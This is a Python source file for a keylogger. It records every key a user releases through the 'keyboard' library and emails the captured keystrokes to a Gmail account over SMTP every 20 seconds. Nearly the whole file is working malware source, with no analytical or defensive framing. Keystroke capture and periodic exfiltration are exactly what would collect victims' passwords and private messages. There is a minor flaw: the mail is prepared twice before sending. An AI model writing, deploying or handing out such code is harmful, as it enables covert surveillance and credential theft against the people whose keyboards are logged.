import keyboard
import smtplib  # for sending email using SMTP protocol (gmail)
import os  # for getting email and password from env vars
from threading import Timer
from datetime import date, datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 20  # in seconds

EMAIL_ADDRESS = os.getenv('EMAIL')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')


def mail_subject():
    current_time = (str(date.today().day) + "-"
                    + str(date.today().month) + "-"
                    + str(date.today().year) + " "
                    + str(datetime.now().hour) + ":"
                    + str(datetime.now().minute) + ":"
                    + str(datetime.now().second))
    return current_time


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # Callback invoked on every key release
    def callback(self, event):
        key_name = event.name
        # not a character, special key (e.g ctrl, alt, etc.)
        # uppercase with []

        if len(key_name) > 1:
            if key_name == "space":
                key_name = " "

            elif key_name == "enter":
                key_name = "[ENTER]\n"

            elif key_name == "decimal":
                key_name = "."

            else:
                key_name = key_name.replace(" ", "_")
                key_name = f"[{key_name.upper()}]"

        # Add keyname to log
        self.log += key_name

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs - " + mail_subject()

        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):

        # manages a connection to an SMTP server

        # FOR GMAIL
        # server = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port = 465)
        #
        # FOR OFFICE 365
        # server = smtplib.SMTP(host="smtp.office365.com", port=587)

        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()  # connect to the SMTP server as TLS mode ( for security )
        server.login(email, password)
        message = self.prepare_mail(message)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    # Gets called every self.interval
    # Sends keylogs and rests 'self.log'
    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback=self.callback)

        self.report()
        print(f"{datetime.now()} - Started keylogger")

        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    print(mail_subject())
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
